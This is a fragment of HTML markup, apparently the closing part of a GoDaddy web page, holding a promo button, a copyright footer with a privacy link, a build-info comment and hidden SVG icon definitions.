                        <button target="_parent" style="margin-left: auto; margin-right: auto;" tabindex="0" class="btn btn-default button btn-purchase btn-block" id="emailPromoButton" type="button">Get Started</button></div>
                      </div></div></div></div></div></div></div></div><div id="footer-595332e034aad5c1056bd2a860e629f8">
                        <footer id="appheader-footer" class="manifest footer">
                        <div role="contentinfo" class="container">Copyright © 1999 - 2020 GoDaddy Operating Company, LLC. All Rights Reserved. 
                          <a class="privacy-link" href="https://www.godaddy.com/legal/agreements/privacy-policy?target=_blank" target="_blank" data-eid="uxp.hyd.int.pc.app_header.footer.privacy_policy.link.click">Privacy Policy</a></div><div id="gtm_privacy"></div></footer></div>
    
 <!--Build info
App: v1
Build time: Fri Nov 13 15:46:04 MST 2020
Build number: 3317
-->
<div style="display: none;" id="svg-container"><svg><symbol id="svg-container-checkmark" viewBox="0 0 24 24">
  
  <title>checkmark</title><path fill-rule="evenodd" d="M21.41 6.5L9 18.91 2.59 12.5 4 11.09l5 5 11-11 1.41 1.41z" clip-rule="evenodd"></path></symbol></svg></div>
  <div style="display: none;" id="svg-container"><svg></svg></div>
  <div style="display: none;" id="svg-container"><svg><symbol id="svg-container-chevron-down-lt" viewBox="0 0 24 24"><title>chevron-down-lt</title>
    <path fill-rule="evenodd" d="M19.39 9.01L12 16.4 4.61 9.01 6.02 7.6 12 13.57l5.98-5.98 1.41 1.42z" clip-rule="evenodd"></path></symbol></svg></div>
    <div style="display: none;" id="icon-svgosm"><div class="undefined"></div>
  <svg><symbol id="icon-svgosm-information" viewBox="0 0 24 24">
  
  <title>information</title><path fill-rule="evenodd" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8zm1-2.8h-2v-7h2v7zm-2-9.7c0-.5.4-1 1-1s1 .5 1 1-.4 1-1 1-1-.4-1-1z" clip-rule="evenodd"></path></symbol></svg>

</div>
</body>
  </html>